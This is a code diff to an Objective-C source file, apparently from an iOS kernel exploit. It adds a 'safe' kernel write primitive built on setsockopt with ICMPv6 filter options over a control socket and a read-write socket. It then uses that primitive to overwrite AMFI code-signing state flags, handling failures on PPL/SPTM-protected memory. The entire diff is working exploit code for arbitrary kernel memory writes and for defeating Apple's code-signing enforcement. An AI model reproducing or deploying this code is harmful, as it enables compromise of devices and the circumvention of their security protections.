@@ -9,6 +9,8 @@
 #import <mach-o/loader.h>
 #import <mach-o/fat.h>
 #import <CommonCrypto/CommonDigest.h>
+#import <sys/socket.h>
+#import <netinet/icmp6.h>
 
 // ---------------------------------------------------------------------------
 // AmfiStateFlags — mirrors the bit-packed flag bytes at state+0x48
@@ -21,6 +23,44 @@ struct AmfiStateFlags {
     uint8_t has_transmuted; // +0x4C
     uint8_t _pad4d[3];
 };
+
+// ---------------------------------------------------------------------------
+// External symbols from kexploit_opa334.m (non-static globals)
+// ---------------------------------------------------------------------------
+extern int controlSocket, rwSocket;
+extern uint8_t controlData[];
+
+// ---------------------------------------------------------------------------
+// Safe write: directly uses setsockopt like early_kwrite32bytes but does NOT
+// crash on failure.  Returns true if the write succeeded, false otherwise.
+// ---------------------------------------------------------------------------
+#define EARLY_KRW_LENGTH 0x20
+static bool safe_setsockopt_write(uint64_t where, uint64_t what)
+{
+    if (controlSocket < 0 || rwSocket < 0) {
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] safe_setsockopt_write: sockets not ready\n");
+        return false;
+    }
+
+    // Set target address
+    memset(controlData, 0, EARLY_KRW_LENGTH);
+    *(uint64_t *)controlData = where;
+    if (setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH) != 0) {
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] safe_setsockopt_write: set_target failed for 0x%llx\n", where);
+        return false;
+    }
+
+    // Write value
+    uint8_t writeBuf[EARLY_KRW_LENGTH];
+    memset(writeBuf, 0, sizeof(writeBuf));
+    *(uint64_t *)writeBuf = what;
+    if (setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf, EARLY_KRW_LENGTH) != 0) {
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] safe_setsockopt_write: write failed for 0x%llx (PPL/SPTM?)\n", where);
+        return false;
+    }
+
+    return true;
+}
 
 // ---------------------------------------------------------------------------
 // Internal helper: write the flag bytes for a given state address
@@ -50,8 +90,14 @@ static bool patch_state_flags(uint64_t state_kptr)
     }
 
     if (changed) {
-        kwritebuf(state_kptr, buf, sizeof(buf));
-        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state patched at 0x%llx\n", state_kptr);
+        // Write the 8 flag bytes at state+0x48 using safe_setsockopt_write
+        // (avoid crashing on PPL/SPTM memory)
+        uint64_t flagBytes = *(uint64_t *)&buf[0x48];
+        if (safe_setsockopt_write(state_kptr + 0x48, flagBytes)) {
+            printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state patched at 0x%llx\n", state_kptr);
+        } else {
+            printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state write failed — PPL/SPTM protected memory\n");
+        }
     } else {
         printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state already has desired flags\n");
     }
